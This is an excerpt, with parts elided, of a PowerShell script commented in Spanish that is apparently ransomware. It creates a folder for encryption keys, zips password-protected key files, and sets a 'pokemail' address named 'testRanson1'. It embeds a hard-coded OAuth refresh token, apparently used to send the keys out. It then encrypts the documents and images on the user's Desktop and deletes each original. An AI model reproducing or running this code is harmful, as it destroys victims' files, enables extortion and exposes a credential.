...
mkdir C:\temp -Force #Carpeta para almacenar archivos y llaves de cifrado
...
Compress-7Zip -Path c:\temp\sys.txt -ArchiveFileName c:\temp\backup-"$NomComputadora".zip -Format Zip -Password "$IV11"
...
#----------------------------------------------------------------------------------------------------------------------------------------
$email = "testRanson1@pokemail.net" # Replace $email with your pokemail address
...
Write-Host "[+] Zipping files!" -ForegroundColor Green
Compress-7Zip -Path c:\temp\sys1.txt -ArchiveFileName c:\temp\backup1-"$NomComputadora".zip -Format Zip -Password "$IV1"
...
#----------------------------------------------------------------------------------------------------------------------------------------
$email1 = "testRanson1@pokemail.net" # Replace $email1 with your pokemail address
...
$params = @{
    ...
    Body = @(
        "refresh_token=1//04NuoLc6jD5FLCgYIARAAGAQSNwF-L9IrpNX9EBTq1LOLj1-RnVRTj9G7dHHXXeQPZDuUAofWW2FDGPlHKMPr_0OBWGqCh2hiq68", # Replace $RefreshToken with your refresh token
...
foreach ($i in $(Get-ChildItem $env:USERPROFILE\Desktop -recurse -include *.txt, *.doc, *.docx, *.ppt, *.pptx, *.xls, *.xlsx, *.pdf, *.png, *.jpg | ForEach-Object { $_.FullName })){ 
  Write-Host "Se manda llamar a la función de CIFRADO para el archivo: $i" -ForegroundColor Green
  Encr -i $i -p $pwd
  rm $i
  Write-Host "Archivo Borrado: $i" -ForegroundColor Green
}
